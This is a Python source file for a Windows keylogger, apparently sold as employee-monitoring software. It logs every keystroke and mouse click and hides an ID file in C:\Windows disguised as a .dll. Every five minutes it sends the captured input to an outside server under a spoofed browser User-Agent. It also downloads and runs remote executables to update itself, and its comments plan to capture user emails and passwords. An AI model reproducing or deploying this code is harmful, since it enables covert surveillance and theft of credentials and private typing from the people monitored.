import os
import time
import sys
from datetime import datetime,date
import platform
import uuid
import psutil
import requests
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import threading
import random, string
key_board=""
mo_use=""
keys = []
contents = ""
version="v6"
print("version",version)
r = ""
start_time = datetime.now()
a = 0
global start_timer, con,S,c,system_id,counter,api_counter,waste_time,today,wpm
wpm=0
counter=0
waste_time = 0
api_counter=5
#-----------------Already running or not------------
from win32event import CreateMutex
from win32api import GetLastError
from winerror import ERROR_ALREADY_EXISTS

handle = CreateMutex(None, 1, 'keyloggerv5')

if GetLastError(  ) == ERROR_ALREADY_EXISTS:
    # Take appropriate action, as this is the second
    # instance of this script; for example:
    print ('Oh! dear, I exist already.')
    sys.exit(1)

#--------------Generate unique id for PC----------------

try:
        with open("C:\Windows\system_id_.dll","r") as f :
                system_id=f.read()
except:

        
        with open("C:\Windows\system_id_.dll","w") as f :
                system_id=str(uuid.uuid4())
                f.write(system_id)
                f.close()
                print("Keylogger Ready to Use")
        os.system("attrib +h C:\Windows\system_id_.dll")
        with open("ready.txt","w") as f:
                f.write(system_id)
                f.close()
        sys.exit()

finally:
        print("system id is::",system_id)

#--------------Old version delete--------
try:
    os.remove("keyloggerv4.exe")
    print("file deleted successfully!!!")
    
except:
    pass
#-----------time set----------

today = date.today()
#----------------Make Logs-----------
# import logging
# try:
#     logging.basicConfig(filename="log.txt", level=logging.DEBUG)
# except:
#     pass

# logging.debug("Debug logging test...")

        

#---------system information--------- 
def system_info():
    global system_inform
    my_system = platform.uname()
    system_inform=my_system.node
system_info()
#-------------Keylogger----------------------
def keylogger():
    print("Starting time::",start_time)
    def on_press(key) :
        pass
    def on_release(key):
        global keys, previous_time,waste_time,r,contents,counter,key_board
        r=key
        current_time = datetime.now()
        try:
            at=current_time-previous_time
            z=at.total_seconds()
            seconds = round(z)
            print(key,'Seconds:', seconds)
        except:
            at = current_time
            print("First Key::",key)
        finally:
            previous_time=current_time   
        F=str(key).replace("'","")
        k=F.replace("Key."," ")
        if k=="cmd":
            k="start"
        elif k=="<96>":
            k="0"
        elif k=="<97>":
            k="1"
        elif k=="<98>":
            k="2"
        elif k=="<99>":
            k="3"
        elif k=="<100>":
            k="4"
        elif k=="<101>":
            k="5"
        elif k=="<102>":
            k="6"
        elif k=="<103>":
            k="7"
        elif k=="<104>":
            k="8"
        elif k=="<105>":
            k="9"
        elif k=="<110>":
            k="."
        elif k=="\\":
            k=chr(92)
        elif k=="\\x01":
            k="ctrl+a"
        elif k=="\\x11":
            k="ctrl+q"
        elif k=="\\x17":
            k="ctrl+w"
        elif k=="\\x03":
            k="ctrl+c"
        elif k=="\\x05":
            k="ctrl+e"
        elif k=="\\x12":
            k="ctrl+r"
        elif k=="\\x14":
            k="ctrl+t"
        elif k=="\\x19":
            k="ctrl+y"
        elif k=="\\x15":
            k="ctrl+u"
        elif k=="\\x0f":
            k="ctrl+o"
        elif k=="\\t":
            k="ctrl+i"
        elif k=="\\x13":
            k="ctrl+s"
        elif k=="\\x04":
            k="ctrl+d"
        elif k=="\\x07":
            k="ctrl+g"
        elif k=="\\x08":
            k="ctrl+h"
        elif k=="\\n":
            k="ctrl+j"
        elif k=="\\x0b":
            k="ctrl+k"
        elif k=="\\x0c":
            k="ctrl+l"
        elif k=="<186>":
            k=":"
        elif k=="<222>":
            k="\""
        elif k=="\\x16":
            k="ctrl+v"
        elif k=="\\x02":
            k="ctrl+b"
        elif k=="\\r":
            k="ctrl+m"
        elif k=="\\x0e":
            k="ctrl+n"
        elif k=="\\x18":
            k="ctrl+x"
        elif k=="\\x10":
            k="ctrl+p"
        elif k=="\\x1a":
            k="ctrl+z"
        elif k=="\\x06":
            k="ctrl+f"
        print("key is",k)
        contents=contents+k
        key_board=key_board+k
        keys.append(k)
        counter=counter+1
        
    def on_click(x, y, button, pressed):
        global keys,r,contents,mo_use
        if pressed:
            print('mouse_{0}({1},{2})'.format(button,x, y))
            mouse=' mouse_{0}({1},{2}) '.format(button,x, y)
            y=str(mouse)
            
            contents=contents+y
            mo_use=mo_use+y
            # keys.append(y)
            
  
        # Setup the listener threads
    keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)
    mouse_listener = MouseListener(on_click=on_click)

    # Start the threads and join them so the script doesn't end early
    keyboard_listener.start()
    mouse_listener.start()
    keyboard_listener.join()
    mouse_listener.join()
#api calling         
def api() :
    global contents,system_id ,counter,api_counter,key_board,mo_use,wpm
    
    
    current_time = datetime.now()
    # keywords
    # waste time
    # user email
    # user password
    # system details
    # start time
    # end time
    
    try:
        wpm=counter/api_counter
        data= {"system":system_inform,
        "start_time":start_time,
        "waste_time":waste_time,
        "keylogger":contents,
        "system_id":system_id,
        "wpm":wpm,"mouse":mo_use,
        "keyboard":key_board}
        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
    }
        response=requests.post('https://www.fineoutput.co.in/emp_manager/employee/api/Software/keylogger',
    data = data,headers=headers)
        success=1
    except:
        success=0
    if success==1:
        print("wpm",wpm,"counter is",counter)
        r=response.json()
        print(r.get("message"),current_time)
        if r.get("version")!=version:
            update()
            os._exit(0)
        contents=""
        key_board=""
        mo_use=""
        counter=0
        api_counter=5  
    else:
     
        print("Warning :: Unable to send Data, Check Your Internet Connection")
        api_counter=api_counter+5
    print("system",system_inform,
        "start_time",start_time,
        "waste_time",waste_time,
        "keylogger",contents,
        "system_id",system_id,
        "wpm",wpm,"\n","mouse",mo_use,"\n",
        "keyboard",key_board)
        
    api_call= threading.Timer(300,api)    
    api_call.start()
      
def timer():
    a=1
    global c,r,waste_time,contents,today
    con=True
                        
    while con==True and a<=120:
        if today!= date.today():
            waste_time=0
            today = date.today()
        print(a)
        
        if r!="":
            print("key found")
            
            r=""
            a=0
            con=False
            start_timer = threading.Thread(target=timer, args=())    
            start_timer.start()
        if a==120:
            waste_time=waste_time+1
            print("waste_timer_counter",waste_time)
            start_timer = threading.Thread(target=timer, args=())    
            start_timer.start()
            
        a +=1
        time.sleep(1)
        

#-----------------Update_Software-------------
def update():
	url="https://www.fineoutput.co.in/emp_manager/employee/assets/uploads/keylogger.exe"
	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'}
	local_filename = url.split('/')[-1]
	r = requests.get(url,headers=headers)
	f = open("keyloggerv6.exe", 'wb')
	for chunk in r.iter_content(chunk_size=512 * 1024): 
		if chunk: # filter out keep-alive new chunks
			f.write(chunk)
	f.close()
	print("Downloaded!!!!")
	os.startfile("keyloggerv6.exe")
	#os.remove("keyloggerv5.exe")
	print("updated file started!!!!")
# def check_watch_dog():
    
#     while True:
        
#         def checkIfProcessRunning(processName):
#             '''
#             Check if there is any running process that contains the given name processName.
#             '''
#             #Iterate over the all the running process
#             for proc in psutil.process_iter():
#                 try:
#                     # Check if process name contains the given name string.
#                     if processName.lower() in proc.name().lower():
#                         return True
#                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
#                     pass
#             return False

#         if checkIfProcessRunning('watchdog.exe'):
#             #print('Yes a watchdog process was running')
#             pass

#         else:
#             # print('No watchdog process was running')
#             try:
#                 os.startfile("watchdog.exe")
#             except:
#                 start_watchdog = threading.Thread(target=check_watch_dog, args=())
#                 start_watchdog.start()

            
        
c=0
t3 = threading.Thread(target=keylogger)
t3.start()
start_timer = threading.Thread(target=timer, args=())
start_timer.start()
api_call= threading.Timer(300,api)    
api_call.start()